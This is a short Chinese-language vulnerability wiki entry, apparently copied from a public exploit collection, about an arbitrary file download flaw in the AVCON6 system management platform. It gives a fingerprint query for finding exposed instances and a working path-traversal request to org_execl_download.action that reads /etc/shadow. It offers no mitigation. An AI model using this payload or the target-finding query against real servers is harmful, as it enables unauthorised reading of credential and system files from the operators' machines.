---
title: "AVCON6 系统管理平台 org_execl_download.action 任意文件下载漏洞"
date: 2026-10-16 09:06:21
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "AVCON6-系统管理平台"
tags:
  - "AVCON6-系统管理平台"
  - "任意文件下载"
  - "漏洞复现"
---
## 漏洞描述

AVCON6 系统管理平台 org_execl_download.action存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器任意文件

## 漏洞影响

```
AVCON6 系统管理平台
```

## 网络测绘

```
app="AVCON-6"
```

## 漏洞复现

登录页面

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101910822.png)

验证POC

```php
/org_execl_download.action?filename=../../../../../../../../../../../../../etc/shadow
```

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101910818.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/AVCON6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-org_execl_download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md)
